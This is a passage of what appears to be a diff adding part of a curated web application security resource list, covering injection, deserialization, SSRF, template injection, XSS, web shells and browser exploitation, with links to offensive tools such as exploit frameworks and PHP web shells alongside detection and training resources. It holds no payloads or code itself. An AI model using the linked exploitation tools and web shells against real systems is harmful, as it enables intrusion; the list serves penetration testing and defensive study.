+* [Various forms of encoding/decoding web app](http://yehg.net/encoding/)
+* [Javascript De-Obfuscation Tools Redux](http://www.kahusecurity.com/2014/javascript-deobfuscation-tools-redux/)
+
+  * Back in 2011, I took a look at several tools used to deobfuscate Javascript.
+    This time around I will use several popular automated and
+    semi-automated/manual tools to see how they would fare against today’s
+    obfuscated scripts with the least amount of intervention.
+
+#### Data Structure Attacks
+
+* --> See XML section
+* [Hunting in the Dark - Blind XXE](https://blog.zsec.uk/blind-xxe-learning/)
+* [Security Implications of DTD Attacks Against a Wide Range of XML Parsers](https://www.nds.rub.de/media/nds/arbeiten/2015/11/04/spaeth-dtd_attacks.pdf)
+* [Comma Separated Vulnerabilities](https://www.contextis.com/blog/comma-separated-vulnerabilities)
+
+#### Electron
+
+* Articles
+
+* [From Markdown to RCE in Atom](https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/)
+
+* Documentation
+
+* [Electron Documentation](https://electronjs.org/docs)
+* [Security, Native Capabilities, and Your Responsibility - Electron Documentation](https://electron.atom.io/docs/tutorial/security/)
+* Talks
+
+* [MarkDoom: How I Hacked Every Major IDE in 2 Weeks - Matt Austin, LevelUp 2017](https://www.youtube.com/watch?v=nnEnwJbiO-A)
+* [As It Stands - Electron Security - 2016](http://blog.scottlogic.com/2016/03/09/As-It-Stands-Electron-Security.html)
+* [As It Stands - Update on Electorn Security - 2016](http://blog.scottlogic.com/2016/06/01/An-update-on-Electron-Security.html)
+* [Modern Alchemy: Turning XSS into RCE](https://blog.doyensec.com/2017/08/03/electron-framework-security.html)
+  [Electron - Build cross platform desktop XSS, it’s easier than you think by Yosuke Hasegawa - [CB16] ](https://www.youtube.com/watch?v=-j1DPPf9Z4U)
+* [Electronegativity - A Study of Electron Security - Carettoni](https://www.blackhat.com/docs/us-17/thursday/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security.pdf)
+* [Build cross platform desktop XSS, it’s easier than you think by Yosuke Hasegawa - CodeBlue16](https://www.slideshare.net/codeblue_jp/cb16-hasegawa-en)
+* [Electron Security Checklist - A guide for developers and auditors - Luca Carettoni](https://www.blackhat.com/docs/us-17/thursday/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf)
+
+#### Embedded Malicious Code
+
+#### Execution After(/Open) Redirect (EAR)
+
+* Execution After Redirect
+
+* [Execution After Redirect - OWASP](<https://www.owasp.org/index.php/Execution_After_Redirect_(EAR)>)
+* [Overview of Execution After Redirect Web Application Vulnerabilities](https://adamdoupe.com/blog/2011/04/20/overview-of-execution-after-redirect-web-application-vulnerabilities/)
+* [EARs in the Wild: Large-Scale Analysis of Execution After Redirect Vulnerabilities](https://www.cs.ucsb.edu/~vigna/publications/2013_SAC_EARdetect.pdf)
+* [Fear the EAR: Discovering and Mitigating Execution After Redirect Vulnerabilities](http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf)
+* Open Redirect
+
+* [Open Redirect Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
+* [Security and Open Redirects Impact of 301-ing people in 2013](https://makensi.es/rvl/openredirs/#/)
+
+#### Exploitation of Authentication
+
+#### Injection Based Attacks
+
+* [Exploiting ShellShock getting a reverse shell](http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell)
+* [Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
+* [Popular Approaches to Preventing Code Injection Attacks are Dangerously Wrong - AppSecUSA 2017](https://www.youtube.com/watch?v=GjK0bB4K2zA&app=desktop)
+* See also: JNDI, JSON, SQLi, XSS
+
+#### OS Command Injection
+
+* General
+
+* [Command Injection - OWASP](https://www.owasp.org/index.php/Command_Injection)
+
+* Testing
+
+* [SHELLING](https://github.com/ewilded/shelling)
+  * A comprehensive OS command injection payload generator
+* [Testing for Command Injection - OWASP](<https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)>)
+* [How To: Command Injections - Hackerone](https://www.hackerone.com/blog/how-to-command-injections)
+* [Data Exfiltration via Blind OS Command Injection](https://www.contextis.com/blog/data-exfiltration-via-blind-os-command-injection)
+* Tools
+
+* [commix](https://github.com/stasinopoulos/commix)
+
+  * Automated All-in-One OS Command Injection and Exploitation Tool
+
+* Writeups
+
+#### JNDI Attack Class
+
+* General
+
+* [What is JNDI ? What is its basic use..? When is it used? - StackOverflow](https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used)
+* [Introducing JNDI Injection and LDAP Entry Poisoning](https://community.softwaregrp.com/t5/Security-Research/Introducing-JNDI-Injection-and-LDAP-Entry-Poisoning/ba-p/219821)
+
+* Testing
+
+* [jndipoc](https://github.com/zerothoughts/jndipoc)
+
+  * Proof of concept showing how java byte code can be injected through
+    InitialContext.lookup() calls
+
+* Tools
+
+* Writeups
+
+* [Java Naming and Directory Interface - Wikipedia](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface)
+* [A Journey from JNDI-LDAP Manipulation to RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
+* [Video - A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land - BH USA16](https://www.youtube.com/watch?v=Y8a5nB-vy78)
+* [Fun with JNDI remote code injection](http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection)
+
+### De-/Serialization Attacks
+
+* Java
+
+* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
+* [Break Fast Serial](https://github.com/GoSecure/break-fast-serial)
+  * A proof of concept that demonstrates asynchronous scanning for Java
+    deserialization bugs
+* [SerialKiller: Bypass Gadget Collection](https://github.com/pwntester/SerialKillerBypassGadgetCollection)
+  * Collection of Bypass Gadgets that can be used in JVM Deserialization Gadget
+    chains to bypass "Look-Ahead ObjectInputStreams" desfensive deserialization.
+* [ysoserial](https://github.com/frohoff/ysoserial)
+* [The perils of Java deserialization](https://community.hpe.com/t5/Security-Research/The-perils-of-Java-deserialization/ba-p/6838995)
+* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
+  * A cheat sheet for pentesters about Java Native Binary Deserialization
+    vulnerabilities
+* [Java Unmarshaller Security - Turning your data into code execution](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
+  * This paper presents an analysis, including exploitation details, of various
+    Java open-source marshalling libraries that allow(ed) for unmarshalling of
+    arbitrary, attacker supplied, types and shows that no matter how this
+    process is performed and what implicit constraints are in place it is prone
+    to similar exploitation techniques.
+  * tool from the above paper:
+    [marshalsec](https://github.com/mbechler/marshalsec/)
+* [Reliable discovery and Exploitation of Java Deserialization vulns](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)
+* [Pwning Your Java Messaging With De- serialization Vulnerabilities](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities-wp.pdf)
+* [Java Deserialization Security FAQ](https://christian-schneider.net/JavaDeserializationSecurityFAQ.html)
+* [The Perils of Java Deserialization](http://community.hpe.com/hpeb/attachments/hpeb/off-by-on-software-security-blog/722/1/HPE-SR%20whitepaper%20java%20deserialization%20RSA2016.pdf)
+* [Detecting deserialization bugs with DNS exfiltration](http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
+* [JMET](https://github.com/matthiaskaiser/jmet)
+  * JMET was released at Blackhat USA 2016 and is an outcome of Code White's
+    research effort presented in the talk "Pwning Your Java Messaging With
+    Deserialization Vulnerabilities". The goal of JMET is to make the
+    exploitation of the Java Message Service (JMS) easy. In the talk more than
+    12 JMS client implementations where shown, vulnerable to deserialization
+    attacks. The specific deserialization vulnerabilities were found in
+    ObjectMessage implementations (classes implementing
+    javax.jms.ObjectMessage).
+* [Serianalyzer](https://github.com/mbechler/serianalyzer)
+  * A static byte code analyzer for Java deserialization gadget research
+* [Java Deserialization Exploits](https://github.com/CoalfireLabs/java_deserialization_exploits)
+
+  * A collection of Java Deserialization Exploits
+
+* Python
+
+* [Exploiting Python Deserialization Vulnerabilities](https://crowdshield.com/blog.php?name=exploiting-python-deserialization-vulnerabilities)
+
+### JSON Web Tokens
+
+* 101
+
+* [JSON Web Token - Wikipedia](https://en.wikipedia.org/wiki/JSON_Web_Token)
+* [RFC 7159: JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
+* [The Anatomy of a JSON Web Token](https://scotch.io/tutorials/the-anatomy-of-a-json-web-token)
+* General
+
+* [Friday the 13th: JSON Attacks - Defcon25](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Alvaro-Munoz-JSON-attacks.pdf)
+* [Critical vulnerabilities in JSON Web Token libraries - 2015](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
+* Testing
+
+* [Attacking JWT authentication](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
+* Tools
+
+* [json token decode](http://jwt.calebb.net/)
+* [JWT Inspector - FF plugin](https://www.jwtinspector.io/)
+  * JWT Inspector is a browser extension that lets you decode and inspect JSON
+    Web Tokens in requests, cookies, and local storage. Also debug any JWT
+    directly from the console or in the built-in UI.
+* Writeups
+
+* [How to configure Json.NET to create a vulnerable web API - alphabot](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html)
+* [?? Learn how to use JSON Web Token (JWT) to secure your next Web App! (Tutorial/Example with Tests!!)](https://github.com/dwyl/learn-json-web-tokens)
+
+### LFI & RFI
+
+* 101
+
+  * [File inclusion vulnerability - Wikipedia](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)
+
+* General
+
+* Testing
+
+* [Unrestricted File Upload Testing](https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/)
+* [LFI Local File Inclusion Techniques (paper)](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)
+  * This paper exposes the ability from the attacker standpoint to use /proc in
+    order to exploit LFI (Local File Inclusion) vulnerabilities. While using
+    /proc for such aim is well known this one is a specific technique that was
+    not been previously published as far as we know. A tool to automatically
+    exploit LFI using the shown approach is released accordingly.
+* [Update: a third (known) technique has been dissected here](http://www_ush_it/2008/07/09/local-file-inclusion-lfi-of-session-files-to-root-escalation/)
+* [psychoPATH - LFI](https://github.com/ewilded/psychoPATH/blob/master/README.md)
+  * This tool is a highly configurable payload generator detecting LFI & web
+    root file uploads. Involves advanced path traversal evasive techniques,
+    dynamic web root list generation, output encoding, site map-searching
+    payload generator, LFI mode, nix & windows support plus single byte
+    generator.
+* Tools
+
+* [Liffy](https://github.com/rotlogix/liffy)
+  * Liffy is a Local File Inclusion Exploitation tool.
+* Writeups
+
+* [Turning LFI into RFI](https://l.avala.mp/?p=241)
+  * When configured in a specific way the web application would load the JAR
+    file and search within the file for a class. Interestingly enough, in Java
+    classes you can define a static block that is executed upon the class being
+    processed
+
+### NodeJS
+
+* General
+
+* [Reverse shell on a Node.js application](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)
+* [NodeJS: Remote Code Execution as a Service - Peabnuts123 – Kiwicon 2016](https://www.youtube.com/watch?v=Qvtfagwlfwg)
+* [SLIDES](http://archivedchaos.com/post/153372061089/kiwicon-2016-slides-upload)
+* Tools
+
+* [faker.js](https://github.com/Marak/faker.js)
+
+  * generate massive amounts of fake data in Node.js and the browser
+
+### (No)SQL Injection
+
+* 101
+
+* General
+
+  * [SQL Injection wiki](http://www.sqlinjectionwiki.com/)
+
+* Reference
+
+  * [SQL Injection Knowledge Base](http://websec.ca/kb/sql_injection#MySQL_Testing_Injection)
+  * [SQL Injection Cheat Sheet](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/)
+  * [SQL Injection Cheat Sheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+
+* Testing
+
+* [Laduanum](http://laudanum.sourceforge.net/)
+  * “Laudanum is a collection of injectable files, designed to be used in a
+    pentest when SQL injection flaws are found and are in multiple languages for
+    different environments.They provide functionality such as shell, DNS query,
+    LDAP retrieval and others.”
+* Tools
+
+* [sqlmap](https://github.com/sqlmapproject/sqlmap)
+* [jSQL Injection](https://github.com/ron190/jsql-injection)
+  * jSQL Injection is a Java application for automatic SQL database injection.
+* [mongoaudit](https://github.com/stampery/mongoaudit)
+* Training
+
+* [SQLi Lab lessons](https://github.com/Audi-1/sqli-labs) \* SQLI-LABS is a
+  platform to learn SQLI
+* Writeups
+
+* [Use google bots to perform SQL injections on websites](http://blog.sucuri.net/2013/11/google-bots-doing-sql-injection-attacks.html)
+* [Performing sqlmap POST request injection](https://hackertarget.com/sqlmap-post-request-injection/)
+* DB2
+* [DB2 SQL injection cheat sheet](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
+* MS-SQL
+* [Pen test and hack microsoft sql server (mssql)](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)
+
+  * MySQL
+  * NoSQL
+
+* [Nosql-Exploitation-Framework](https://github.com/torque59/Nosql-Exploitation-Framework)
+
+  * A FrameWork For NoSQL Scanning and Exploitation Framework
+
+* [Making Mongo Cry Attacking NoSQL for Pen Testers Russell Butturini](https://www.youtube.com/watch?v=NgsesuLpyOg)
+* [MongoDB: Typical Security Weaknesses in a NoSQL DB](http://blog.spiderlabs.com/2013/03/mongodb-security-weaknesses-in-a-typical-nosql-database.html)
+* [MongoDB Pentesting for Absolute Beginners](https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/mongodb/MongoDB%20Pentesting%20for%20Absolute%20Beginners.pdf)
+
+  * PostgreSQL
+
+* [PostgreSQL Pass The Hash protocol design weakness](https://hashcat.net/misc/postgres-pth/postgres-pth.pdf)
+
+  * Oracle SQL
+
+* [Oracle SQL Injection Guides & Whitepapers](https://haiderm.com/oracle-sql-injection-guides-and-whitepapers/)
+
+### Path Traversal Attacks
+
+* [Exploiting PHP File Inclusion – Overview](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
+* [dotdotpwn](https://github.com/wireghoul/dotdotpwn)
+
+  * It's a very flexible intelligent fuzzer to discover traversal directory
+    vulnerabilities in software such as HTTP/FTP/TFTP servers, Web platforms
+    such as CMSs, ERPs, Blogs, etc.
+
+### Server Side Request Forgery (SSRF)
+
+* 101
+
+* [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
+* [What is Server Side Request Forgery (SSRF)?](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
+* [What is the Server Side Request Forgery Vulnerability & How to Prevent It? - netsparker](https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/)
+* [Vulnerable by Design: Understanding Server-Side Request Forgery - BishopFox](https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/)
+* General
+
+* [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
+* Writeups
+
+* [SSRF VS BUSINESS-CRITICAL APPLICATIONS PART 1: XXE TUNNELING IN SAP NET WEAVER - erpscan](https://erpscan.com/wp-content/uploads/publications/SSRF-vs-Businness-critical-applications-final-edit.pdf)
+* [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - Orange Tsai - BH USA 17](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
+* [curl Based SSRF Exploits Against Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)
+* [Pivoting from blind SSRF to RCE with HashiCorp Consul](http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)
+* [ How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
+* [Airbnb – Chaining Third-Party Open Redirect into Server-Side Request Forgery (SSRF) via LivePerson Chat](https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/)
+* Testing/Tools
+* [SSRF bible. Cheatsheet](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.t4tsk5ixehdd)
+* [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing/)
+* [How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
+* [Port scanning with Server Side Request Forgery (SSRF) - acunetix](https://www.acunetix.com/blog/articles/ssrf-vulnerability-used-to-scan-the-web-servers-network/)
+
+### Server Side Include
+
+* General
+
+* [Server Side Includes - Wikipedia](https://en.wikipedia.org/wiki/Server_Side_Includes)
+* [Server-Side Includes (SSI) Injection - OWASP](<https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection>)
+* Testing
+
+* [Testing for SSI Injection (OTG-INPVAL-009) - OWASP](<https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009)>)
+
+### Server Side Template Injection
+
+* General
+
+* [Server-Side Template Injection: RCE for the modern webapp](https://portswigger.net/knowledgebase/papers/ServerSideTemplateInjection.pdf)
+* [Server-Side Template Injection](http://blog.portswigger.net/2015/08/server-side-template-injection.html)
+  * [Video](https://www.youtube.com/watch?v=3cT0uE7Y87s)
+  * This paper defines a methodology for detecting and exploiting template
+    injection, and shows it being applied to craft RCE zerodays for two widely
+    deployed enterprise web applications. Generic exploits are demonstrated for
+    five of the most popular template engines, including escapes from sandboxes
+    whose entire purpose is to handle user-supplied templates in a safe way.
+* Writeups
+
+* [Exploring SSTI in Flask/Jinja2](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/)
+* [Ruby ERB Template Injection](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
+* [Remote Code Execution via Server Side Template Injection at OFBiz 13.07.03 (CVE-2016-4462)](https://insinuator.net/2016/07/dilligent-bug/)
+* [Injecting Flask - Nvisium](https://nvisium.com/blog/2015/12/07/injecting-flask/)
+* Tools
+* [tplmap](https://github.com/epinna/tplmap)
+
+  * Code and Server-Side Template
+
+* [Templates Injections - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections)
+
+### Subresource Integrity
+
+* General
+
+* [Subresource Integrity - W3C](https://www.w3.org/TR/SRI/)
+* [Subresource Integrity - Mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
+* [Subresource Integrity (SRI) for Validating Web Resources Hosted on Third Party Services (CDNs) - Netsparker](https://www.netsparker.com/blog/web-security/subresource-integrity-SRI-security/)
+* [SRI Hash Generator](https://www.srihash.org/)
+
+### SWF
+
+* General
+
+* [The old is new, again. CVE-2011-2461 is back!](https://www.slideshare.net/ikkisoft/the-old-is-new-again-cve20112461-is-back)
+  * As a part of an ongoing investigation on Adobe Flash SOP bypass techniques,
+    we identified a vulnerability affecting old releases of the Adobe Flex SDK
+    compiler. Further investigation traced the issue back to a well known
+    vulnerability (CVE20112461), already patched by Adobe. Old vulnerability,
+    let's move on? Not this time. CVE20112461 is a very interesting bug. As long
+    as the SWF file was compiled with a vulnerable Flex SDK, attackers can still
+    use this vulnerability against the latest web browsers and Flash plugin.
+    Even with the most recent updates, vulnerable Flex applications hosted on
+    your domain can be exploited. In this presentation, we will disclose the
+    details of this vulnerability (Adobe has never released all technicalities)
+    and we will discuss how we conducted a large scale analysis on popular
+    websites, resulting in the identification of numerous Alexa Top 50 sites
+    vulnerable to this bug. Finally, we will also release a custom tool and a
+    Burp plugin capable of detecting vulnerable SWF applications. \* Advanced
+    Flash Vulnerabilities in Youtube Writeups Series
+* [Advanced Flash Vulnerabilities in Youtube – Part 1](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-1/)
+* [Advanced Flash Vulnerabilities in Youtube – Part 2](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/)
+* [Advanced Flash Vulnerabilities in Youtube – Part 3](https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/)
+* [Decode Adobe Flex AMF protocol](http://blog.dornea.nu/2015/06/22/decode-adobe-flex-amf-protocol/)
+* Securing
+
+* [HardenFlash](https://github.com/HaifeiLi/HardenFlash)
+
+  * Patching Flash binary to stop Flash exploits and zero-days
+
+* Tools
+
+* [ParrotNG](https://github.com/ikkisoft/ParrotNG/releases)
+  * ParrotNG is a Java-based tool for automatically identifying vulnerable SWF
+    files, built on top of swfdump. One JAR, two flavors: command line tool and
+    Burp Pro Passive Scanner Plugin.
+* [deblaze](http://blog.dornea.nu/2015/06/22/decode-adobe-flex-amf-protocol/)
+  * Performs method enumeration and interrogation against flash remoting end
+    points.
+
+### Timing Attacks
+
+* [Timing attack - Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)
+* [Race conditions on the web ](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
+* Practical Race Condition Vulnerabilities in Web Applications
+* [Race The Web (RTW)](https://github.com/insp3ctre/race-the-web)
+
+  * Tests for race conditions in web applications by sending out a
+    user-specified number of requests to a target URL (or URLs) simultaneously,
+    and then compares the responses from the server for uniqueness. Includes a
+    number of configuration options.
+
+* [timing_attack](https://github.com/ffleming/timing_attack)
+
+  * Perform timing attacks against web applications
+
+  fuse.ca/race-conditions-in-web-applications.htm)
+
+* [Race condition exploit](https://github.com/andresriancho/race-condition-exploit)
+
+  * Tool to help with the exploitation of web application race conditions
+
+### Web Hooks
+
+* [Webhooks - pbworks](https://webhooks.pbworks.com/w/page/13385124/FrontPage)
+* [WebHook - Wikipedia](https://en.wikipedia.org/wiki/Webhook)
+* [Abusing Webhooks for Command and Control - Dimitry Snezhkov - BSides LV 2017](https://www.youtube.com/watch?v=TmLoTrJuung) \*
+  [octohook](https://github.com/dsnezhkov/octohook)
+
+### Web Shells
+
+* Articles
+
+* Detection
+
+* [Case Study: How Backdoors Bypass Security Solutions with Advanced Camouflage Techniques](https://www.incapsula.com/blog/backdoor-malware-analysis-obfuscation-techniques.html)
+
+  * Look at PHP obfuscation methods for webshells
+
+* [NeoPI](https://github.com/Neohapsis/NeoPI)
+
+  * What is NeoPI? NeoPI is a Python script that uses a variety of statistical
+    methods to detect obfuscated and encrypted content within text/script files.
+    The intended purpose of NeoPI is to aid in the detection of hidden web shell
+    code. The development focus of NeoPI was creating a tool that could be used
+    in conjunction with other established detection methods such as Linux
+    Malware Detect or traditional signature/keyword based searches.
+
+* [Shell Detector](https://github.com/emposha/Shell-Detector)
+
+  * Shell Detector – is a application that helps you find and identify
+    php/cgi(perl)/asp/aspx shells. Shell Detector has a “web shells” signature
+    database that helps to identify “web shell” up to 99%.
+
+- [Loki - Simple IOC Scanner](https://github.com/Neo23x0/Loki)
+
+  * Scanner for Simple Indicators of Compromise
+
+### Tools
+
+* [Weevely](https://github.com/epinna/weevely3)
+
+  * Weevely is a command line web shell dinamically extended over the network at
+    runtime used for remote administration and pen testing. It provides a
+    weaponized telnet-like console through a PHP script running on the target,
+    even in restricted environments. The low footprint agent and over 30 modules
+    shape an extensible framework to administrate, conduct a pen-test,
+    post-exploit, and audit remote web accesses in order to escalate privileges
+    and pivot deeper in the internal networks.
+
+* [Getting Started](https://github.com/epinna/weevely3/wiki#getting-started)
+* [b374k shell 3.2](https://github.com/b374k/b374k)
+
+  * This PHP Shell is a useful tool for system or web administrator to do remote
+    management without using cpanel, connecting using ssh, ftp etc. All actions
+    take place within a web browser
+
+* [Simple websockets based webshell](http://ibreak.software/2015/02/18/simple-websockets-based-webshell/)
+* [JSShell](https://github.com/Den1al/JSShell/)
+
+  * An interactive multi-user web based JS shell written in Python with Flask
+    (for server side) and of course Javascript and HTML (client side). It was
+    initially created to debug remote esoteric browsers during tests and
+    research. I'm aware of other purposes this tool might serve, use it at your
+    own responsibility and risk.
+
+* [htshells](https://github.com/wireghoul/htshells)
+
+  * Self contained web shells and other attacks via .htaccess files.
+
+### XSS
+
+* 101
+
+* [3 Types of XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting)
+  * Reflected, Persistent, DOM-based
+* General
+
+* [Postcards from a Post-XSS World - Michael Zalewski](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection)
+  * This page is a rough collection of notes on some of the fundamental
+    alternatives to direct script injection that would be available to attackers
+    following the universal deployment of CSP or other security mechanisms
+    designed to prevent the execution of unauthorized scripts. I hope to
+    demonstrate that in many cases, the capabilities offered by these
+    alternative methods are highly compatible with the goals of contemporary XSS
+    attacks.
+* [Self XSS: we’re not so different you and I - Mathias Karlsson](https://www.youtube.com/watch?v=l3yThCIF7e4)
+* Testing
+* [XSS Test String Dump](https://github.com/zsitro/XSS-test-dump/blob/master/xss.txt)
+* [XSS Filter Bypass List](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
+* [HTML Purifier XSS Attacks Smoketest](http://htmlpurifier.org/live/smoketests/xssAttacks.php)
+* Training
+
+* [XSS-Game.appspot](https://xss-game.appspot.com/)
+* [Firing-Range](https://github.com/google/firing-range)
+
+  * Firing Range is a test bed for web application security scanners, providing
+    synthetic, wide coverage for an array of vulnerabilities.
+
+* [XSSer](https://xsser.03c8.net/)
+* [prompt.ml - XSS Injection Game](http://prompt.ml/about)
+* [alert1 to win - XSS Injection Game](https://alf.nu/)
+* Tools
+
+* [xsscrapy](https://github.com/byt3bl33d3r/xsscrapy)
+* [XSS Sniper](https://sourceforge.net/projects/xssniper/)
+* [Xenotix](https://github.com/ajinabraham/OWASP-Xenotix-XSS-Exploit-Framework)
+  * OWASP Xenotix XSS Exploit Framework is an advanced Cross Site Scripting
+    (XSS) vulnerability detection and exploitation framework.
+* [xssValidator](https://github.com/nVisium/xssValidator)
+
+  * This is a burp intruder extender that is designed for automation and
+    validation of XSS vulnerabilities.
+
+* [Shuriken](https://github.com/shogunlab/shuriken)
+  * Cross-Site Scripting (XSS) command line tool for testing lists of XSS
+    payloads on web apps.
+* Writeups
+
+* [Writing an XSS Worm](http://blog.gdssecurity.com/labs/2013/5/8/writing-an-xss-worm.html)
+
+### API Stuff
+
+* Fuzzing
+
+* [Fuzzapi](https://github.com/lalithr95/Fuzzapi/)
+  * Fuzzapi is rails application which uses API_Fuzzer and provide UI solution
+    for gem.
+* [Automating API Penetration Testing using fuzzapi - AppSecUSA 2016](https://www.youtube.com/watch?v=43G_nSTdxLk)
+* General
+
+* [WebSocket API Standards](https://www.w3.org/TR/2011/WD-websockets-20110929/)
+* [White House Web API Standards](https://github.com/WhiteHouse/api-standards)
+  * This document provides guidelines and examples for White House Web APIs,
+    encouraging consistency, maintainability, and best practices across
+    applications. White House APIs aim to balance a truly RESTful API interface
+    with a positive developer experience (DX).
+* Securing
+
+* [RESTful API Best Practices and Common Pitfalls](https://medium.com/@schneidenbach/restful-api-best-practices-and-common-pitfalls-7a83ba3763b5)
+* [OWASP API Security Project](https://www.owasp.org/index.php/OWASP_API_Security_Project)
+
+* Tools
+
+* [Postman - chrome plugin](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop)
+* [restclient - Firefox addon](https://addons.mozilla.org/de/firefox/addon/restclient/)
+
+### Attacking Browsers
+
+* [White Lightning Attack Platform](https://github.com/TweekFawkes/White_Lightning)
+
+* Browser Extensions
+
+* [Attacking Browser Extensions](https://github.com/qll/attacking-browser-extensions)
+* [Botnet in the Browser: Understanding Threats Caused by Malicious Browser Extensions](https://arxiv.org/pdf/1709.09577.pdf)
+* [An in-depth look into Malicious Browser Extensions(2014)](http://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-into-malicious-browser-extensions/)
+
+* Exploiting
+
+* [Smashing The Browser: From Vulnerability Discovery To Exploit](https://github.com/demi6od/Smashing_The_Browser)
+
+  * Goes from introducing a fuzzer to producing an IE11 0day
+
+* [The Birth of a Complete IE11 Exploit Under the New Exploit Mitigations](https://www.syscan.org/index.php/download/get/aef11ba81927bf9aa02530bab85e303a/SyScan15%20Yuki%20Chen%20-%20The%20Birth%20of%20a%20Complete%20IE11%20Exploit%20Under%20the%20New%20Exploit%20Mitigations.pdf)
+* [BeEF Browser Exploitation Framework](http://beefproject.com/)
+
+### CMS specific Tool
+
+* General
+
+* Drupal
+
+* [Drupal Security Checklist](https://github.com/gfoss/attacking-drupal/blob/master/presentation/drupal-security-checklist.pdf)
+* [Drupal Attack Scripts](https://github.com/gfoss/attacking-drupal)
+
+  * Set of brute force scripts and Checklist
+
+* [Droopescan](https://github.com/droope/droopescan)
+
+  * A plugin-based scanner that aids security researchers in identifying issues
+    with several CMSs, mainly Drupal & Silverstripe.
+
+- Joomla
+
+- [Highly Effective Joomla Backdoor with Small Profile](http://blog.sucuri.net/2014/02/highly-effective-joomla-backdoor-with-small-profile.html)
+- [JoomScan](https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project)
+  * Joomla! is probably the most widely-used CMS out there due to its
+    flexibility, user-friendlinesss, extensibility to name a few.So, watching
+    its vulnerabilities and adding such vulnerabilities as KB to Joomla scanner
+    takes ongoing activity.It will help web developers and web masters to help
+    identify possible security weaknesses on their deployed Joomla! sites. No
